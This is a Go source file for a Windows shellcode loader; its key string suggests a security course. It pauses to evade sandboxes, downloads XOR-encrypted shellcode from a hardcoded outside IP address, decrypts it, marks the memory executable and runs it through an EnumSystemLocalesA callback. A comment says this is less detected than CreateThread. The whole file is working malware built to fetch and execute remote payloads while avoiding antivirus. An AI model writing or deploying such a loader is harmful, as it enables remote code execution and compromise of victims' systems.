package main

import (
	"io"
	"net/http"
	"syscall"
	"time"
	"unsafe"
)

const (
	serverHost = "195.0.1.5"
	serverPort = "8080"
)

var xorKey = []byte("SecurityUTalca2026")

func xor(d, k []byte) []byte {
	out := make([]byte, len(d))
	for i, b := range d {
		out[i] = b ^ k[i%len(k)]
	}
	return out
}

func main() {
	time.Sleep(15 * time.Second)

	resp, err := http.Get("http://" + serverHost + ":" + serverPort + "/sc")
	if err != nil {
		return
	}
	defer resp.Body.Close()
	enc, err := io.ReadAll(resp.Body)
	if err != nil {
		return
	}

	sc := xor(enc, xorKey)
	size := uintptr(len(sc))

	k32 := syscall.NewLazyDLL("kernel32.dll")
	vAlloc   := k32.NewProc("VirtualAlloc")
	vProtect := k32.NewProc("VirtualProtect")
	enumLoc  := k32.NewProc("EnumSystemLocalesA")

	addr, _, _ := vAlloc.Call(0, size, 0x3000, 0x04)
	if addr == 0 {
		return
	}

	dst := (*[1 << 30]byte)(unsafe.Pointer(addr))
	copy(dst[:size], sc)

	var old uint32
	vProtect.Call(addr, size, 0x20, uintptr(unsafe.Pointer(&old)))

	// Ejecutar via callback EnumSystemLocalesA — menos detectado que CreateThread
	enumLoc.Call(addr, 0)
}
